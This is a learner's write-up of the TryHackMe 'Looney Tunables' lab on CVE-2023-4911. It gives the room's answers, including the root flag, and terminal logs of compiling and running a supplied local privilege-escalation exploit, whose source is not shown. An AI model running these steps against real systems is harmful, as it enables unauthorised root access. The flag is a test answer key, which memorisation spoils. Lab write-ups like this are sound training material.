<p align="center">November 11, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{189}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ Looney Tunables }}$$ </h1>
<p align="center">CVE-2023-4911: That's all Sec-Folks!</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/looneytunes">GitLab CVE-2023-7028</a>.</p>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/2701eded-3213-4aa9-9919-720579b58a44"><br>
  <img height="150px" src="https://github.com/user-attachments/assets/684afecc-06b7-464c-abfe-eee8c72c461e">
</p>


<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [2. Background Information](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [3. Time to Analyze the Vulnerable Code!](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<br>
<br>
<br>
<h2 align="center">Task 1. Introduction<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>Click and continue learning!</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<h2 align="center">Task 2. Background Information<a id='2'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 2.1. <em>Click and continue learning!</em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<h2 align="center">Task 3. Time to Analyze the Vulnerable Code!<a id='3'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 3.1. <em>Click and continue learning!</em><br><a id='3.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>


<h2 align="center">Task 4. Exploitation<a id='4'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 4.1. <em>Click and continue learning!</em><br><a id='4.1'></a>
>> <code><strong>No answer needed</strong></code>


<br>


<h2 align="center">Task 5. Try It Yourself!<a id='5'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 5.1. <em></em>What's the value of the flag in /root/root.txt?<a id='5.1'></a>
>> <code><strong>THM{TH-TH-THATS-SECURE-FOLKS!}</strong></code>

<br>

<pre><code>$root@[Attack_Box]:~# ssh nopriv@[Target]
The authenticity of host '[Target] (1[Target])' can't be established.
...
nopriv@1[Target]'s password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

...

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

56 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
...
nopriv@looneytunes:~$ ls
exp.c  gen_libc.py
nopriv@looneytunes:~$ 
</code></pre>

<br>

<pre><code>nopriv@looneytunes:~$ ls
exp.c  gen_libc.py
nopriv@looneytunes:~$ ^C
nopriv@looneytunes:~$ readelf /usr/bin/man -p .interp

String dump of section '.interp':
  [     0]  /lib64/ld-linux-x86-64.so.2

nopriv@looneytunes:~$
</code></pre>

<br>

<pre><code>nopriv@looneytunes:~$ ldd /usr/bin/man
	linux-vdso.so.1 (0x00007fff21fea000)
	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fa38ecac000)
	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fa38ec7c000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa38ec5a000)
	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fa38ec4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa38ea25000)
	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fa38ea11000)
	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fa38e9f1000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fa38edd6000)
nopriv@looneytunes:~$
</code></pre>

<br>


<pre><code>nopriv@looneytunes:~$ ldd /usr/bin/man
	linux-vdso.so.1 (0x00007fff21fea000)
	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fa38ecac000)
	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fa38ec7c000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa38ec5a000)
	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fa38ec4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa38ea25000)
	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fa38ea11000)
	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fa38e9f1000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fa38edd6000)
nopriv@looneytunes:~$
</code></pre>

<br>

<pre><code>nopriv@looneytunes:~$ ls
exp.c  gen_libc.py
nopriv@looneytunes:~$ gcc -o exploit exp.c
nopriv@looneytunes:~$ ls
exp  exp.c  exploit  gen_libc.py
nopriv@looneytunes:~$ chmod +x exploit
nopriv@looneytunes:~$ ./exploit
try 100
try 200
try 300
try 400
try 500
try 600
try 700
try 800
try 900
try 1000
try 1100
try 1200


	
</code></pre>

<br>


<h2 align="center">Task 6. Conclusion<a id='5'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 6.1. <em></em>What's the value of the flag in /root/root.txt?<a id='6.1'></a>
>> <code><strong>No answer needed}</strong></code>

